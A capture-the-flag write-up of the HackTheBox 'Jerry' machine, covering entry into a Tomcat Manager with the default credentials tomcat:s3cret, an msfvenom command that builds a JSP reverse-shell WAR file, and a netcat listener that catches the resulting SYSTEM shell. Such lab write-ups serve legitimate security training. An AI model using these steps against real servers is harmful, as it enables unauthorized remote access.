---
title: "Jerry HTB [Easy]"
date: 2020-01-07T11:49:16-05:00
draft: false
description: "Jerry is an Easy machine on HackTheBox.eu | Tomcat Manager Vulnerability"

---

# Description  
Jerry is an Easy machine on HackTheBox.eu

**Host Information**  
Hostname: JERRY   
IP Address: 10.10.10.95  

**Service Enumeration**   
NMAP RESULTS:
```
PORT     STATE SERVICE
8080/tcp open  http-proxy
```

## Attack Path  

Navigating to http://10.10.10.95:8080/ we find a default Tomcat installation. The manager allows us to upload arbitrary war files, so if we can access it, we can upload a shell to the system.  

Tomcat installations often leverage default credentials for setup, especially if the installation is in its default format as we see when navigating to the homepage. I guessed tomcat:s3cret and that worked (a common default credential for old tomcat), but this can also be derived manually by goign to /manager and clicking cancel, the default password is listed in the example. 

We can create our reverse shell to upload to the manager with

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=[YOUR IP] LPORT=4444 -f war -o shell.war
```

On your local instance you can catch the shell with:  
```bash
$ nc -lvp 4444
```

Execute the shell by clicking the link created for you when you upload the shell to the tomcat manager. You catch the shell and with a simple "whoami" we find that we are authority / system. This is root on a Windows box so we can now retrieve the root hash. 

